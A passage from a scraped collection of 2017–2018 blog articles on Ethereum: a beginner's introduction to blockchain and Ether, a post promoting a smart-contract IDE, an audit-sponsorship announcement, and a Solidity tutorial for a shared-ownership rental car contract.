is an additional status of poll closed which gets determined by the poll closeTime property, i.e.if (closeTime > now) => Poll is closedThis is set in the openPoll function as:now + pollDuration * 1 hoursPoll duration is set in hours as the lowest denominator for poll duration time, however you can easily adjust that to minutes, seconds, days etc.Poll VotingIn the second article we will examine the Secret Voting implementation and the double linked lists data structures we use to manage these.", "responses": ""}, {"title": "Writing Software Contracts for Ethereum\u200a\u2014\u200aPart\u00a01", "author_name": "Satish Manohar Talim", "link": "https://medium.com/@IndianGuru/writing-software-contracts-for-ethereum-part-1-a9c2eb1bd27?source=search_post", "post_date": "Jul 16, 2017", "readtime": "8 min read", "upvotes": "95", "content": "Writing Software Contracts for Ethereum\u200a\u2014\u200aPart\u00a01Satish Manohar TalimBlockedUnblockFollowFollowingJul 16, 2017(Updated on 26th Jan. 2018)In Part 2 we understand some basics of Solidity language and write a simple software contract for Ethereum using Remix.In Part 3 we will setup our private blockchain using gethVenturing into the world of building smart contracts on Ethereum can be very daunting at first. Where do you start?Ethereum is really fast moving. This means a lot of the tutorials you will try and follow will not quite work.My search continues and I have plucked bits and pieces from all over the place and this is what I have come up with.First, the basics.The BasicsWho is Vitalik\u00a0Buterin?Vitalik is the creator of Ethereum. He first discovered blockchain and cryptocurrency technologies through Bitcoin in 2011. He wrote the Ethereum white paper in November 2013. He now leads Ethereum\u2019s research team, working on future versions of the Ethereum protocol.What\u2019s a Blockchain?We have this idiom in the English language that goes something like this: \u201cset it in stone\u201d (we have a pretty high level of trust in stone). A blockchain is really just the above: a kind of material that, through a special mix of cryptography and decentralization, has the properties of permanence, transparency, and neutrality\u200a\u2014\u200awhatever you put on it. Except now we can do it digitally.Ethereum is an open source blockchain platform with built in programming language that allows developers to write, test and execute their decentralized application (contract). Data stored on Ethereum blockchain can be viewed by anyone but one having the private key can access it, and is the owner. Any transaction performed is anonymous, parties involved are always unknown.At the most basic level a blockchain is a digital ledger of transactions, one that is accessible to the public and keeps track of transactions anonymously. It is an open-source software, which means that anyone can see what is happening and make changes to it. What is unique about it is that through cryptography, the recordings are secure and essentially unalterable. At the same time, any changes made to the ledger are distributed globally. Because essentially anyone can participate in and verify the transaction, it puts the power of verification in the hands of those who use it. Blockchain is virtually impossible to hack. This blockchain is not controlled by a central administrator, but instead each node in the network stores its own copy of the blockchain that is shared and visible to anyone within the network.Image Reference\u200a\u2014\u200ahttps://bitsonblocks.net/In the image above, blocks in a chain refer to previous blocks, like page numbers in a bookEvery \u201cblock\u201d in this blockchain contains a record of recent transactions, a reference to the block that came immediately before it, and an answer to a difficult mathematical puzzle, among other things.A blockchain is collectively maintained by \u201cminers\u201d, who are members within the network that compete to validate Ether transactions in each block by solving the complex algorithmic problem associated with the block. They do this by buying or renting lots of computing power to run these complex algorithmic problems on. The incentive for them to use their computing power to verify transactions is that they are rewarded with Ether (shortened to ETH, is Ethereum\u2019s digital currency) if they solve the problem and validate a Ethereum block.Ethereum Blockchain App Platform\u2019s main page is\u200a\u2014\u200ahttps://ethereum.org/Types of BlockchainsPublic blockchain like Bitcoin, Ethereum. Public blockchains by nature are open source.Consortium blockchain\u200a\u2014\u200aexample is R3 which is a distributed database technology company. It leads a consortium of more than 70 of the world\u2019s biggest financial institutions in research and development of blockchain database usage in the financial system. Just anybody can\u2019t get involved in the consensus process as one can do in a public blockchain.Private blockchain. A company\u2019s very private information may be kept on this type of blockchain. An example of this is MultiChain.Is Blockchain a revolutionary piece of technology?Yes.With the use of smart contracts (more on this later) on top of the blockchain along with no single point of failure it will be possible to transfer things of value such as property, vehicles etc. very securely (with the power of cryptography). As such this will allow us to transfer very securely things of extreme value. It also cuts out any middle man (Lawyers, Estate Agents etc.) in the above transactions. Also, deals or transactions get completed far quickly.What\u2019s Ethereum?Ethereum is software running on a network of computers that ensures that data and small computer programs called smart contracts are replicated and processed on all the computers on the network, without a central coordinator. The small computer programs being run are called smart contracts, and the contracts are run by participants on their machines using a sort of operating system called a \u201cEthereum Virtual Machine\u201d (EVM).In other words, Ethereum is an open software developer platform based on blockchain technology that makes it very easy for people to build and deploy decentralized applications (dapps).Ethereum applications will always, without fail, execute the code they say it will. The code can always be checked. One can personally check and ensure that it does what it says it does.There is no downtime. These applications are always going to be available.Ethereum applications are resistant to DDOS attacks.Previously building decentralized applications required a very good and complex knowledge of Cryptography or cryptology.Ethereum makes this technology available to all by simplifying it.Ethereum has a complete programming language, sometimes called EtherScript (though not so popularly used).How does the change a person makes with a transaction, gets verified by a majority and conformed into the blockchain?A user makes a transaction and broadcasts it to the network. The entire Ethereum network is a giant mass of nodes (computers) connected to one another.Nodes (computers) verify that the transaction is correctly signed and if so, pass it to their peers.A miner\u2019s node will take the transactions with a sufficient gas price (i.e, sufficient transaction fees) and process them to create the contents of the block.The miner tries random numbers until they find one that, hashed with the contents of a block, proves a sufficient amount of work.The miner broadcasts the block.Each node checks the validity of the entire block, from the header to verifying the result of every transaction, and if it checks out, it declares that block valid and passes it on. Otherwise, it ignores the block.Each node that handles the transaction personally checks to make sure it\u2019s valid. So even if it appears that every other node on the whole network insists that this or that transaction happened, a node can still decide that that transaction was invalid. \u201cConsensus\u201d means that everyone will hopefully reach the same answer eventually, not that nodes necessarily listen to the voice of the majority.Who is using Ethereum?Tech giant IBM is building a blockchain-based platform for seven big European banks, including HSBC and Deutsche Bank, that is aimed at simplifying trade finance transactions for small- and medium-sized companies.Other interested companies include Microsoft, JP Morgan Chase, Deloitte amongst many other large corporations.Then there is the Enterprise Ethereum Alliance that connects Fortune 500 enterprises, startups, academics, and technology vendors with Ethereum subject matter experts.Many dapps have already been built on Ethereum\u200a\u2014\u200ahttps://dapps.ethercasts.com/Some of the areas, other than finance, where blockchain is being used are:Why become a Blockchain developer?There are five areas in which there is a growing need for blockchain developers:Startups in the Blockchain and Crytocurrency fieldCorporate Tech Firms like IBM, Microsoft etc.Banks especially global banksGovernment organizationsProfessional Services firms like KPMG, Deloitte, PricewaterhouseCoopers (PwC), Ernst & Young (EY) etc.It is expected that the would-be blockchain developer has an understanding of:You are able to code in different languages especially like Java and C++You are comfortable with Large data setsYou have a basic understanding of CrytographyYou have a basic understanding of the BlockchainWhat\u2019s Ether?Ether (shortened to ETH) is Ethereum\u2019s digital currency.Every single step in a smart contract is a transaction or a complex computation. Running and storing things on Ethereum would have a cost that is measured in \u201cgas\u201d. The price of this gas is paid by the requester in \u201cEther\u201d. Ether is the digital currency with which everything runs in the Ethereum (Ether\u2019s price as on 26th Jan. 2018 at 8.50 hrs (IST) was US$ 1,066.59\u200a\u2014\u200ahttps://etherscan.io/stat/supply ). The main reason why people fulfill their end of the bargain in a contract is that they are incentivized to collect Ether.Ether is the second most valuable Crypto currency after Bitcoin\u200a\u2014\u200ahttp://coinmarketcap.com/ and http://coinmarketcap.com/currencies... Ethereum\u2019s technology which we briefly mentioned above is what making Ether\u2019s price shoot up as we go ahead.Ether has a lot in common with the famous digital currency Bitcoin. Both are a purely digital store of value and means of exchange that cannot be counterfeited. Both are implemented so that no one can manipulate the currency supply. Both can be transferred around the world, like email, and in a very final way, like cash. Both have value today because users expect them to have value tomorrow, and because they can do things traditional money can\u2019t.It is very important that we have these two things absolutely clear:Smart contracts are how things get done in Ethereum.Ether is the currency that is used in the Ethereum network to do anything.The primary difference between Ethereum and any other cryptocurrency is that it\u2019s not just a currency, it\u2019s an environment. Here anyone can take advantage of the blockchain technology to build their own projects and DAPPS (decentralized applications) through smart contracts.ETH UnitsJust like 1 dollar can be split into 100 cents, and 1 Bitcoin (BTC) can be split into 100,000,000 satoshi. Ethereum too has its own unit naming convention.The smallest unit is a wei and there are 1,000,000,000,000,000,000 of them per ETH. There are also some other intermediate names: Finney, Szabo, Shannon, Babbage, Ada\u200a\u2014\u200aall named after people who made significant contributions to fields related to cryptocurrencies or networks.Wei and Ether are the two most common denominations.Image Reference\u200a\u2014\u200ahttps://bitsonblocks.net/Where do I buy\u00a0Ether?The following sites would help you in buying Ether:https://bittylicious.com/https://shapeshift.io/#/coinshttps://www.coinbase.com/?locale=enhttps://localbitcoins.comhttp://faucetdump.com/ethereumhttps://www.quora.com/Where-can-I-buy-Ethereum-in-IndiaResourcesVideos:What is BlockchainWhat is the Blockchain\u00a0?The Block Chain\u200a\u2014\u200aThe BasicsLinks:Everything you\u2019ve ever wanted to know about Ethereum, patiently explainedWhat is Blockchain Technology? A Step-by-Step Guide For BeginnersHow To Setup An Ethereum Wallet And Buy A Custom TokenCryptoCurrency Market CapitalizationsJobs via angel.co | blocktribe.com |", "responses": ""}, {"title": "Scaling Crypto User Experience", "author_name": "Ronald Mannak", "link": "https://hackernoon.com/scaling-crypto-user-experience-c7d5280eb477?source=search_post", "post_date": "Sep 11, 2018", "readtime": "5 min read", "upvotes": "188", "content": "Scaling Crypto User ExperienceRonald MannakBlockedUnblockFollowFollowingSep 11, 2018How many people you know have installed and set up a wallet and are using crypto on a regular basis? Depending on how you count, it seems unlikely that the current crypto users represent more than 1% of the total addressable market.A current low adoption rate might indicate the enormous growth potential of crypto. Just imagine what 10x more users \u2014which is still only 10% of the addressable market\u2014 could mean. On the other hand, there is a possibility we will never get to 10%. Promising technology has failed before, as Varun Mathur correctly states in this tweetstorm.Crypto challengesWhat is holding back a broader adoption of crypto? I see three main issues that haven\u2019t been solved yet:Scalability (How many concurrent users or transactions can the system handle?)Utility (What can I use it for?)User-Experience (How easy is it to use?)The smartest minds in the industry are currently working on scaling blockchain technology. Once scaling is solved, utility will be the next area of focus. For utility to increase, a good user-experience is imperative.In terms of where energy and money is spent on, user-experience seems to be underrepresented at the moment. Current tools and apps took us from 0 to 1%, but the next 10% users might not be willing (or able) to figure out the often confusing interfaces.Start with customer experience?Steve Jobs once said: \u201cyou\u2019ve got to start with the customer experience, and work backwards to the technology\u201d. Unfortunately, crypto doesn\u2019t have that luxury. Crypto wasn\u2019t built with a great user-experience in mind, as Connie Yang shows in her blogpost Why design is the killer app for crypto. While it\u2019s certainly possible (and necessary!) to slap better design on a technically complex system, it will be challenging.\u201cYou\u2019ve got to start with the customer experience, and work backwards to the technology.\u201dCurrent IssuesIt is encouraging to see people like Varun and Connie working on user-experience. And they\u2019re not alone, design firms like IDEO are also working on improving user experience.I believe we need more than great designers. I believe we also need developers who have experience building apps with great user-experience, like iOS and MacOS developers for example. As Microsoft Steve Ballmer famously said: \u201cDevelopers\u201d.\u201cDevelopers\u201d (20x)I am a crypto developer. I\u2019ve written smart contracts in Ethereum\u2019s Solidity language and I\u2019ve created tools to make it easier to use crypto in mobile applications. The Ethereum developer toolchain has improved substantially the last year. But especially for occasional Ethereum developers, it still lacks the polish and ease-of-use of for instance the Apple or Microsoft developer toolchain.Several other crypto developers told me they use several tools to write smart contracts. Atom for coding, Remix, a web-based tool that only works if you\u2019re online, for debugging and deploying. It works, but it\u2019s not the best experience.The Turbo Pascal\u00a0EffectMS-DOS programming in the early 1980s was not unlike blockchain development in 2018: Developers used separate tools, dedicated to specific tasks: an editor, a command line compiler, a command line debugger, and a command line linker.That all changed with the introduction of Borland Turbo Pascal in 1984. The innovation was to package all the separate tools into a single Integrated Development Environment (IDE). For the first time, the whole development workflow could be covered with one single application. Turbo Pascal simplified the edit-compile-run-debug loop. (The low price of $49, and the unusually good documentation also helped)Borland sold 400,000 copies in the first 2.5 years. Especially impressive considering that the total addressable market was estimated at just 30,000. Borland created a market nobody knew existed.One unexpected side effect of the Turbo Pascal success was that the number of MS-DOS applications skyrocketed, thereby contributing to MS-DOS becoming the dominant platform.Composite: Turbo Pascal for BlockchainCrypto desperately needs its Turbo Pascal moment: a tool so powerful and easy to use, both quantity and quality of dApps will skyrocket. That way, both higher utility and better user-experience will be tackled.I have been working on an open source editor that could become the Turbo Pascal for Blockchain, called Composite. It\u2019s the easiest developer tool on the market. Since it is developed natively in Swift/Cocoa, it\u2019s also the fastest developer tool out there. It\u2019s lightning fast.1. Installing the toolchain and keeping it up-to-date is finally a\u00a0breeze.2. Creating a new project is as easy as choosing a templates. You\u2019ll be able to create your own templates in future versions.3. Name your new\u00a0project.4. Editing, debugging, and deploying all from one single easy-to-use application.What about blockchains that aren\u2019t Ethereum?The current pre-alpha version of Composite is Ethereum only, but Composite is designed to support more blockchains. I\u2019d love to add support for more blockchains and make it dApp development easy for every blockchain.If you are a smart contract developer and would love to use Composite on another blockchain than Ethereum, leave a comment.What is a blockchain worth without adoption or utility?A blockchain without users or usage isn\u2019t worth much. Composite makes it easy for blockchains to attract high-quality developers and have them developed useful and easy-to-use dApps. If you are developing a blockchain and would like to see support for your blockchain in Composite, email me.What\u2019s next?If you want to keep up-to-date on Composite development, join the Composite Telegram group: https://t.me/joinchat/F84Ewkd5t-RLL26-Wj7tPAIf you like to test the pre-alpha version of Composite, or are interested in adding support for your blockchain to Composite, email me.If you work at a crypto company and are interested in having Composite support your blockchain, email me.Composite is self-funded. If you want to support Composite, consider donating Bitcoin: 3BADHnwyuK54ZVa1dRtRj6Jj8H2BJz63Rc or Ethereum 0x7e77Bf36DAE7202927Fbf91A5f9e2E4e1837f077. Thank you in advance.BitcoinEthereum", "responses": ""}, {"title": "ZK Labs Community Audits Initiative for non-ICO\u00a0Projects", "author_name": "Matthew Di Ferrante", "link": "https://blog.zklabs.io/zk-labs-community-audits-initiative-for-non-ico-projects-ea7830d082f8?source=search_post", "post_date": "Sep 25, 2018", "readtime": "3 min read", "upvotes": "389", "content": "ZK Labs Community Audits Initiative for non-ICO\u00a0ProjectsMatthew Di FerranteBlockedUnblockFollowFollowingSep 25, 2018As part of a broader pursuit to securing the ecosystem, we at ZK Labs are excited to announce our Community Audits initiative to sponsor audits for projects that have not done ICO and don\u2019t plan to do one.Examples of eligible projects include tooling and libraries important to the development ecosystem (e.g., web3js, solc), non-profit smart contract infrastructure (e.g. ENS, Multisig wallets), open source crypto code/libraries (e.g., ZoKrates), or services beneficial to community.Note that the project doesn\u2019t necessarily need to be non-profit to qualify, as long as it can serve as a utility to the community\u200a\u2014\u200afor example, gambling contracts will never be eligible, but a state channel platform that has some fee system built in could be fine. The point of the community audits initiative is for grassroots projects to be able to receive quality audits without needing to think about raising large amounts of funding before the project can go live, and without having to go through a complex ECF-type application process for a grant.", "responses": ""}, {"title": "A Smart Contract for a Smart\u00a0Car", "author_name": "Pablo Ruiz", "link": "https://hackernoon.com/a-smart-contract-for-a-smart-car-db08eda4bb4f?source=search_post", "post_date": "Nov 1, 2017", "readtime": "16 min read", "upvotes": "118", "content": "Photo by Evgeny Tchebotarev on\u00a0UnsplashA Smart Contract for a Smart\u00a0CarPablo RuizBlockedUnblockFollowFollowingNov 1, 2017Last year while I was attending a fintech conference I listened Brett King talking about how the cars of the future would be able not only to drive by themselves, but also, thanks to Blockchain technology they would be able to work for their owners. Since I heard that there have been a few developments in this area, but we are yet very far from being able to own a piece of a car that will drive for Uber instead of accumulating dust in a parking lot and making money for me while I\u2019m at the office.That talk stuck with me, but as much as I\u2019d like to build such a car, I don\u2019t even know how a regular car works. Fortunately for me, I do know a bit about software development and smart contracts, so in this article I\u2019d like to give some thought about how I\u2019d build such a contract for a driverless car.For this article I\u2019ll layout the basics of an autonomous car whose ownership is shared by several people. The car will be available for any 3rd party to rent it for the day and then, once the rental period is over it will distribute its earnings to the owners. (Minus eth gas stipends and other expenses).Some assumptions and considerations about this smart car and its\u00a0contractFor this analysis I will be making some assumptions that will simplify the logic of the smart contract.First, I\u2019ll be assuming that the car, somehow, is running a full node that allows it to sign transactions. The car would own an account/address which will be the \u201cowner\u201d of the smart contract that interacts with the different actors.Second, I won\u2019t be dealing with a lot of real-world issues such as the person renting the car stealing it, or being involved in an accident that renders the car unusable.Third, ownership of the car will be very simple. First of all, owners get a piece of the car from the get go, assuming the payment was made off-chain in the dealership. Then, each owner has an equal share of the car. Finally, we won\u2019t be dealing with complex decisions as this article would get very extensive.Finally, I\u2019m also assuming that the car, somehow, provides the user with some interface that is able to interact with the smart contract. Furthermore, the car can schedule certain functions to be called later in time, such as calling the function in the smart contract that ends the rental period after 24 hours. Also, I\u2019m assuming that the users posses a device capable of interacting with the blockchain such as a web3 enabled browser.The purpose of these assumptions is making the smart contract as simple as possible while leaving as many decisions as possible to the car itself. I\u2019m quite certain that what follows is possible in a real-world scenario, but may not be the optimal solution. By all means, feel free to discuss better approaches or point out parts of the contract that you think would not work at all in the real world.The Smart\u00a0ContractThe complete code for the smart car contract (v0.1) can be found in the following Github repo: https://github.com/pabloruiz55/SmartCar/blob/master/contracts/SmartCar.solWhat follows is not the complete code, but a highlight of the most important parts of it.Initializing the car smart\u00a0contract//The address of the car, which will sign transactions made by this contract.address public carSigner;// Value of the car, in weiuint public carValue;bytes32 public licensePlate;// Owners of the car, they will be the ones that receive payments from the car.// We assume each owner owns the car equally.address[] public owners;uint constant MAX_OWNERS = 100;//Earning from driving will be distributed to each owner for them to withdrawmapping (address => uint) public ownersBalance;uint public balanceToDistribute;uint constant INITIAL_CAR_SHARES = 100;mapping (address => uint) public carShares;DriverEntity currentDriverEntity;DriveStatus currentDriveStatus;//To keep track of who's currently using the car//If the owners are driving it, it will be their address.//If someone rented it, it will be the renter address, so he can be held accountable.//In this case, we could even ask for a warranty which will be sent back if the car is ok.address currentDriverAddress;uint currentDriveStartTime = 0;uint currentDriveRequiredEndTime = 0;//Ratesuint constant RATE_DAILYRENTAL = 1 ether; //1 ETHenum DriverEntity {    None,    Owner,    Autopilot,    Cab,    Uber,    DailyRental,    Other  }enum DriveStatus {    Idle,    Driving,    TurnedOff,    Unavailable  }// Somehow, the car should be able to communicate its \"internals\" to the contract.// These internals are the ones relevant to the functioning of the contract, such as it's fuel.// We don't care about oil or coolant for example, at this point at least.struct CarInternals {    uint fuel; //Measured in percentage  }CarInternals carInternals;bool carIsReady = false;modifier onlyIfReady {        require(carIsReady);        _;    }function SmartCar(bytes32 _licensePlate, uint _carValue){    require(_licensePlate.length >0 && _carValue > 0);    carSigner = msg.sender;    carValue = _carValue;    licensePlate = _licensePlate;    carShares[address(this)] = INITIAL_CAR_SHARES;    currentDriveStatus = DriveStatus.Idle;    currentDriverEntity = DriverEntity.None;    carInternals.fuel = 100;  }Let me explain each state variable and the constructor for the SmarCar contract:carSigner: This is the account that represents the car. As I mentioned before, the car is supposed to be running its own node which will sign the transactions that it needs to execute. This is the account that will deploy the contract for the car. In a real life scenario, I imagine the manufacturer setting up the car node and account. We would assume that neither the dealership nor the manufacturer has access to the private keys of this account. What I\u2019m trying to say is: The car will need to execute contract functions and the only way for it to do it would be if the car itself is an Externally Owned Account that can communicate with the smart contract without depending on human interaction.carValue / LicensePlate: This are values that should be provided when the car contract is deployed. LicensePlate could be used to identify the car (We are not making any checks to make sure it is unique, though) and carValue sets the price the owners paid for it. We are not using carValue, but we could have a function that allows an owner to sell his share of the car to someone else, and carValue/owners could be used for establishing a base price.owners / MAX_OWNERS = 100: Owners is an array that holds the address of all the owners of the car. MAX_OWNERS is a constant that will put a cap on how many owners the car can have.ownersBalance / balanceToDistribute: ownersBalance will be used to store the pending balance each owner has available for withdrawal. When the car starts a paid ride it will store the ether received in its own balance, then when the ride ends it will be distributed to each owner in equal parts for the owner to manually withdraw his balance.carShares / INITIAL_CAR_SHARES = 100: carShares is used to store how much of the car each owner has. For the time being, we made it so that each owner owns equal parts of the car, but it could be done so someone could own 50% of the car and other 10 people 5% each. That would also have to affect how earnings are distributed so it is done pro-rata.currentDriverEntity / currentDriveStatus: These variables are part of a state machine that will control what the car is currently doing. For instance, if its being driven, the contract shouldn\u2019t allow for someone else to rent it. We are also using DriverEntity to keep track of what the car is currently doing\u200a\u2014\u200aIs it working for Uber? Has it been rented for the day? Is one of the owners using it? This also raises a few more questions about how autonomous the car should be and how to determine what it should be doing, which I\u2019ll discuss at the end of the article, but that is also way out of the scope of this article.currentDriverAddress / currentDriveStartTime / currentDriveRequiredEndTime: These variables keep track of who has currently rented the car, when the rental period started and when it is supposed to end (24 hours after the rental period started). currentDriveRequiredEndTime is used to determine if the person that rented the car returned it within the specified rental period. For the time being we are just logging this, but some action could be taken if the conditions are not met.CarInternals: We are not doing anything with this yet, but this could be used to keep track of the internals of the car. Does it need fuel? What\u2019s the battery status? Does it need an oil change? Coolant? If any of these internals are in critical levels, what should it do?SmartCar constructor: The constructor of this contract is pretty straightforward. We are just setting the initial state of a few of these variables and most importantly assigning the carSigner.Assigning the\u00a0owners//We will assume, for the time being, that the owners are set by the carSigner automatically,//and that they can't be changed.//We are basically doing the purchase of the car, off-chain.//We also assume that each person payed the same amount for the car, thus owning equal shares.function setOwners(address[] _owners) public {  require(msg.sender == carSigner);  require(_owners.length > 0 && _owners.length <= MAX_OWNERS);  //Can only set owners once.  require(owners.length == 0);  owners = _owners;  //We take the total carShares the \"car\" owns and we distribute them equally among new owners  //If the shares are not properly divisible (I.E: 100 shares / 3 owners) the remaining shares stay with the car    uint sharesToDistribute = carShares[address(this)]/owners.length;  for (uint8 i; i<owners.length;i++){      carShares[owners[i]] = sharesToDistribute;      carShares[address(this)] -= sharesToDistribute;    }  carIsReady = true;}The setOwners function receives an array of addresses making them the owners of the car. After this function is called, the car will have one or more owners which will share the carShares in equal parts.\u00a0This function is meant to be called by the carSigner, which I don\u2019t yet know if optimal, but we are assuming this is set up at the dealership. So, as you must have figured out by now, there\u2019s a huge part of the system that still requires a lot of human interaction and coordination. In this case, the dealership would be responsible for having these owners pay their part of the deal and then, somehow, have the car register its brand new owners. I imagine the guy at the dealership using his password to unlock some kind of interface in the car that will prompt it to execute this function on the smart contract.Renting the car for the\u00a0day// Anyone can rent the car for the day, as long as it is idle.// In real life, the workflow could be as follows:// 1. User calls this function from his mobile device or browser web3 dapp, sending the correct amount of eth// 2. The system generates a PIN number (we are just using his address as PIN right now)// 3. User gets on the car and unlocks it using the pin.// As it stands, we assume that the car, somehow recognizes that the user// that paid is actually in the car. We added a activateCar function that// acts as if it was a PIN.function rentCarDaily() public onlyIfReady payable{  //No one must be using the car  require (currentDriveStatus == DriveStatus.Idle);  require (msg.value == RATE_DAILYRENTAL);  currentDriverAddress = msg.sender;  currentDriveStatus = DriveStatus.Driving;  currentDriverEntity = DriverEntity.DailyRental;  currentDriveStartTime = now;  currentDriveRequiredEndTime = now + 1 days;  balanceToDistribute += msg.value; // ADD SafeMath Library  E_RentCarDaily(currentDriverAddress,msg.value,   currentDriveStartTime,currentDriveRequiredEndTime);}Once the car has been acquired it is ready to be used. Right now we are only implementing one rental option: anyone can rent it by the day, by paying 1 eth (yes, since its a very novel and amazing car its price is outrageous).What this function basically does is to set its new state (being driven as a rental for the day) and registering who rented it, at what time and when he should be returning it. Also, we are adding the ether received to the contract\u2019s internal balance so it knows how much money should be later distributed to the owners.Once again, there\u2019s a lot of assumptions going on here. I\u2019m imagining the person renting the car used his web3 enabled browser to access a dapp to execute this function. But how does the car know that the person starting the car is this person. Well, we could have this function generate a receipt with a PIN number and have the car prompt for the PIN when someone tries to start it. Another solution could be to have the car prompt for payment when someone tries to drive it, but this would require a high level of trust as the driver would have to use his private key to sign the transaction in a rather public device. It would be a very risky proposition\u2026 I wouldn\u2019t try to access my home banking from a pc in a public library, why would I unlock my Ethereum account in a \u201cpublic\u201d car?// For the car to start it will ask the user for his PIN. Instead of generating a PIN  // we are using his address as PIN, making sure they match.  // This would be done in the car interface, of course it's a terrible user experience to as for an  // address instead of a 4 digit PIN, but it will do for now.  // We are not using this internally.function activateCar(address _user) public view onlyIfReady returns(bool){    require (_user == currentDriverAddress);    return true;  }Here\u2019s a very simplistic solution. Assume the car prompts the user to enter his address each time he tries to start the car. It would check if the address entered is the same that rented the car. Simple but suboptimal. For one, anyone could scan the latest transactions to know who rented it and use his address to \u201csteal\u201d the rental from them\u200a\u2014\u200athough this could be mitigated by hashing the address. Second, it\u2019s a terrible user experience! Imagine having to enter 42 characters in the car touchscreen just to start the car each time.Returning the car and distributing earnings// This should be called by the end of the rental period.// Driver would tell the car to end the rental and the car would execute this function.// Also, the car can call it if the rental period ended. (This would be scheduled car-side)// Here, we distribute earnings and do the necessary cleanup such as// issuing fuel recharge if needed.function endRentCarDaily () public onlyIfReady {  // The person renting the car can end the rental anytime.  // The carSigner can end the rental only after the renting period has ended  // in order to \"claim the car back\".  require ((msg.sender == carSigner && now > currentDriveRequiredEndTime)            || msg.sender == currentDriverAddress);  //To be called only if it is being rented for the day.  require (currentDriveStatus == DriveStatus.Driving);  require (currentDriverEntity == DriverEntity.DailyRental);  bool endedWithinPeriod = now <= currentDriveRequiredEndTime;  E_EndRentCarDaily(currentDriverAddress, now, endedWithinPeriod);  currentDriverAddress = address(0);  currentDriveStatus = DriveStatus.Idle;  currentDriverEntity = DriverEntity.None;  currentDriveStartTime = 0;  currentDriveRequiredEndTime = 0;  //Distribute earnings of the car rental  distributeEarnings();}Once the customer is done with the car he can return it by calling this function. This will basically end the rental period, make the car available again for others to rent it and distribute the earnings to the owners. The car itself can end the rental period if 24 hours have passed and the driver has not done it. For this to be possible, that car would have to schedule this function call internally as there is no way as of today for a contract function to be scheduled.Notice we are not doing anything to punish the driver for not returning the car in time, but something could be done like asking for a warranty payment beforehand and holding that in escrow until the car is returned. If they returned the car after the 24 hours rental period ended they could be charged extra.Also, we are not taking into account the fuel level the car had when it was rented. Should the driver return the car as it was when it was rented? Should he be charged more for the fuel difference?\u200a\u2014\u200aOr even refund money if gas was at 50% and they return it at 75%?//Distribute earnings to ownersfunction distributeEarnings() internal onlyIfReady {  //If the carSigner is running out of eth for transactions, transfer before distribution  transferEthForStipends();  //ETH should also be reserved for recharging fuel at a station.   Not considered yet.  //refuelCar();  uint earningsPerOwner = balanceToDistribute / owners.length;  for (uint8 i=0;i<owners.length;i++){   ownersBalance[owners[i]] += earningsPerOwner; // ADD SafeMath Library   balanceToDistribute -= earningsPerOwner; // ADD SafeMath Library  }}Once the car has been returned it will calculate and distribute the money to each one of the car shareholders. Before the money is distributed, it has to keep some money to pay for its own expenses, though.For the time being we are just considering the gas stipends the carSigner has to pay for for calling each and every function throughout the day. Each transaction the car does costs some gas and the carSigned is the one that pays for them in most cases, so it should have an allocation of ether for the car to be able to function properly.Here we could also calculate the fuel that was consumed and other expenses the car had to pay during this trip.\u200a\u2014\u200aTolls, public parking, etc.\u200a\u2014\u200aand keep that money before distributing its balance to the owners.// carSigner will need eth to pay for gas stipends being used throughout the day.// It should be able to get it from the car contract balance.// This would be called by the car automatically each day, for example.function triggerTransferEthForStipends() public onlyIfReady{  require(msg.sender == carSigner);  transferEthForStipends();}function transferEthForStipends() internal onlyIfReady {  uint amount = 1 * (10 ** 17);  // 0.1 eth per day should be enough  require (carSigner.balance < amount);  require(balanceToDistribute >= amount);  balanceToDistribute -= amount; // ADD SafeMath Library  carSigner.transfer(amount);  E_TransferEthForStipends(carSigner,amount, now);}This function makes sure carSigner (the car) has enough eth for calling the car contract functions throughout the day. This gets called after every ride, just in case, but can also be triggered by the car if it detected it doesn\u2019t have enough money to function properly.Withdrawal of\u00a0funds//Each owner should call this function to withdraw the balance they have pending.function withdrawEarnings() public onlyIfReady{  //Make sure the one calling the function is actually an owner  bool isOwner = false;    for (uint8 i=0;i<owners.length;i++){      if (owners[i] == msg.sender){        isOwner = true;        break;      }    }  require (isOwner);  uint balanceToWithdraw = ownersBalance[msg.sender];  require (balanceToWithdraw > 0);  ownersBalance[msg.sender] =0;  msg.sender.transfer(balanceToWithdraw);}Finally, at any time, each owner can execute this function to withdraw whatever pending balance they are owed.Where to go from\u00a0here?There are so many improvements that could be made to this contract that it\u2019s hard to figure out where to start. I\u2019ve raised a few concerns and pointed several places in the code where there could be room for improvement, for instance:Is there a better way to build this rather than having the car execute transactions? How can the car node be set up safely. Should the manufacturer do this? The dealership?We are not using carValue. Should we allow owners to sell their share of the car? Should we use carValue or the owner can set his asking price? Should anyone be able to sell his share of the car at any moment? Should there be a voting process? Can anyone buy it?We are not contemplating a case where someone could buy a bigger share of the car. Right now everyone has the same ownership percentage, and we are assuming the all paid the same amount of money at the dealership.\u200a\u2014\u200aWell, we are also assuming a dealership is prepared to have multiple people buy a share of a car in Fiat currency and somehow that translates to this on-chain scenario seamlessly,\u00a0:D\u200a\u2014\u200aSo, this could be done differently and not necessarily each owner should own the car in equal parts. This would also affect earnings distribution and expenses.Right now we assume the car is Idle and that anyone can come and rent it for the day (or an owner use it, or have it work for Uber, though these functions have not been implemented). But how should the car decide what it should do? Should it allow someone to rent it for the day without asking the owners if they will need it today? If several owners express their need to use the car, how will it be decided who has priority over it? If the car is meant only for rental, how does it decide when it\u2019s best to work for Uber or be rented for the day or work as a cab?When the car is returned, if it was not returned within the 24 hours period, we are not taking actions. What should happen if the rental period is over and the driver didn\u2019t return the car yet. Should the car, somehow, stop working? Should it prompt the driver to make a new payment? Should we have asked for a warranty before rental and kept the money on escrow? Should we blacklist the driver so they are not allowed to rent this car (or any other car in the network) ever?The car internals: The contract will need to know, at the very least, if the car need refueling. What would be the most efficient way for the car to communicate this? We are assuming the car has every kind of sensors that would allow it to get this data and in turn, forward this data to the smart contract.The way we assign the owners is suboptimal. First, we could have another entity, the car dealership for example, that upon receiving the money is authorized to call this function on the car smart contract to register the owners. Second, in this example, we are allowing owners to be set just once when the car is bought. How about letting a current owner buy another one out? What if we wanted someone else become owner of the car later on? Third, and this has to do in part with the fact that we are not allowing owners to own more shares of a car than others, if we have 3 owners they are getting 33% of the car each and the remaining 1% is held by the car itself, what should we do with that?\u00a0Finally, so far it doesn\u2019t even matter how much of the car someone owns as it is not being used to calculate the distribution of earnings. One more thing, maybe we don\u2019t even have to distribute the money the car earns according to ownership.As you can see, this articles raises a lot of questions for which I don\u2019t have the answers yet, but I hope it starts a debate on how the Ethereum blockchain is supposed to interact with IOT projects and the other way around.Feel free to share any suggestions or critics in the comments section below!", "responses": "1"}, {"title": "Hands 